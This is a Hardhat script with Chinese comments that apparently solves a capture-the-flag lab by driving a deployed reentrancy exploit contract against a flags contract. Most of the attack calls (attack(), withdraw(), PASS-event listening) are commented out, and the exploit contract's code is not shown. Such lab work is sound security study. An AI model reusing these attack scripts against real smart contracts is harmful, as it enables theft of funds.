// import { ethers } from "hardhat";
// const exploitContractABI = ["function attack() public payable"];
const flagsContractABI = [
  { inputs: [], stateMutability: "nonpayable", type: "constructor" },
  {
    anonymous: false,
    inputs: [
      {
        indexed: false,
        internalType: "address",
        name: "targetContract",
        type: "address",
      },
      {
        indexed: false,
        internalType: "address",
        name: "origin",
        type: "address",
      },
    ],
    name: "PASS",
    type: "event",
  },
  {
    inputs: [],
    name: "acquireFlag",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "set", type: "address" }],
    name: "setFlag",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "withdraw",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

// async function main() {
//   // 獲取已部署合約的地址
//   const flagsContractAddress = "0x4Ee5C4Ab799404Dc474B8509b07C5a2E38F314F6";
//   const attackerContractAddress = "0x48BcC558240432B70444d960FCCA6954d1c5B1fF";

//   if (!flagsContractAddress || !attackerContractAddress) {
//     throw new Error(
//       "請先設置環境變數 FLAGS_CONTRACT_ADDRESS 和 ATTACKER_CONTRACT_ADDRESS"
//     );
//   }

//   console.log("連接到合約...");
//   console.log("OnsiteW2Lab1Flags 合約地址:", flagsContractAddress);
//   console.log("ReentrancyAttacker 合約地址:", attackerContractAddress);

//   const [attacker] = await ethers.getSigners();
//   console.log("攻擊者地址:", attacker.address);

//   // 獲取合約實例
//   // const flagsContract = await ethers.getContractAt(
//   //   "OnsiteW2Lab1Flags",
//   //   flagsContractAddress
//   // );

//   // const attackerContract = await ethers.getContractAt(
//   //   "ReentrancyAttacker",
//   //   attackerContractAddress
//   // );

//   const flagsContract = new ethers.Contract(
//     flagsContractAddress,
//     flagsContractABI,
//     attacker
//   );

//   const attackerContract = new ethers.Contract(
//     attackerContractAddress,
//     attackContractABI,
//     attacker
//   );

//   const passFilter = flagsContract.filters.PASS();

//   // 監聽事件
//   console.log("正在監聽 PASS 事件...");
//   flagsContract.on(passFilter, (targetContract, origin, event) => {
//     console.log("🎉 攻擊成功! Flag 已獲取!");
//     // exit
//     process.exit(0);
//   });

//   // 執行攻擊
//   console.log("開始執行攻擊...");
//   const contractBalance = await ethers.provider.getBalance(
//     attackerContractAddress
//   );
//   console.log("合約餘額:", ethers.formatEther(contractBalance), "ETH");
//   // if (contractBalance < ethers.parseEther("0.0002")) {
//   //   console.log("合約餘額不足，先轉入一些 ETH...");
//   //   const tx = await attackerContract.fundContract({
//   //     value: ethers.parseEther("0.0002"), // 發送 0.05 ETH
//   //   });
//   //   await tx.wait();
//   //   console.log("已轉入 ETH 到目標合約");
//   // }
//   const tx = await attackerContract.attack({
//     value: ethers.parseEther("0.00000000000000001"),
//   });
//   console.log("攻擊交易已發送，等待確認...");
//   const receipt = await tx.wait();
//   if (!receipt) {
//     throw new Error("交易確認失敗");
//   }
//   console.log("攻擊交易已確認，交易哈希:", receipt.hash);
//   console.log("從攻擊合約提取ETH...");
//   const withdrawTx = await attackerContract.withdraw();
//   await withdrawTx.wait();
//   console.log("ETH 提取成功");
//   await new Promise(() => {});
// }

import { ethers } from "hardhat";

async function main() {
  // === 你要先填上這兩個地址 ===
  const FLAGS_ADDRESS = "0x4Ee5C4Ab799404Dc474B8509b07C5a2E38F314F6";
  const EXPLOIT_ADDRESS = "0xb8125a61480dDb9e6748C4E7dbd19127F51d8C4C";

  // 取得帳號（攻擊者）
  const [attacker] = await ethers.getSigners();

  const flagsContract = new ethers.Contract(
    FLAGS_ADDRESS,
    flagsContractABI,
    attacker
  );

  const attackerContract = await ethers.getContractAt(
    "Exploit",
    EXPLOIT_ADDRESS,
    attacker
  );

  // const filter = flagsContract.filters.PASS(); // 只查你的 address
  // const events = await flagsContract.queryFilter(filter);
  // console.log(events.length > 0 ? "你已經PASS！" : "你還沒PASS！");
  // if (events.length > 0) {
  //   console.log("你已經PASS！");
  //   process.exit(0);
  // }

  // // 檢查 exploit 合約是否已經有 Ether，如果沒有，需要先用普通帳號轉一點進去
  // // const txFund = await attacker.sendTransaction({
  // //   to: EXPLOIT_ADDRESS,
  // //   value: ethers.parseEther("0.000000001"),
  // // });
  // // await txFund.wait();

  // // 呼叫攻擊函數（傳1 ether給attack）
  console.log(ethers.parseEther("1"));
  // const tx = await attackerContract.attack({
  //   value: ethers.parseUnits("1", 18),
  // });
  // const receipt = await tx.wait();
  // console.log("Attack executed!");
  // if (!receipt) {
  //   throw new Error("交易確認失敗");
  // }
  // // 監聽 PASS 事件
  // for (const log of receipt.logs) {
  //   try {
  //     const parsed = flagsContract.interface.parseLog(log);
  //     if (parsed && parsed.name === "PASS") {
  //       console.log("PASS event detected:");
  //       console.log(`targetContract: ${parsed.args.targetContract}`);
  //       console.log(`origin: ${parsed.args.origin}`);
  //     }
  //   } catch (e) {
  //     // 不是該合約事件就略過
  //     console.log(e);
  //   }
  // }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
